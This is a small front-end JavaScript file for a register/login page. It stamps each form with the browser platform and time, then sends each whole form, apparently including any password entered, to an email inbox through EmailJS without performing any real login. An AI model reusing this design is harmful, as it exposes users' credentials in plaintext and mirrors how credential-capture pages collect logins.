// Fill metadata fields
document.getElementById('pc-reg').value = navigator.platform;
document.getElementById('pc-login').value = navigator.platform;
document.getElementById('time-reg').value = new Date().toLocaleString();
document.getElementById('time-login').value = new Date().toLocaleString();

function toggleForm() {
    const regBox = document.getElementById('register-box');
    const loginBox = document.getElementById('login-box');
    
    regBox.classList.toggle('hidden');
    loginBox.classList.toggle('hidden');
}

const SERVICE_ID = "service_zq2bbfh";
const TEMPLATE_ID = "template_q8paakv";

document.getElementById('regForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
        .then(function() {
            toggleForm();
            alert("Registration submitted! Please login.");
        }, function(error) {
            alert("Registration failed: " + JSON.stringify(error));
        });
});

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const status = document.getElementById('status-message');

    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
        .then(function() {
            status.innerText = "login and email notification sent";
        }, function(error) {
            status.innerText = "Error: " + JSON.stringify(error);
        });
});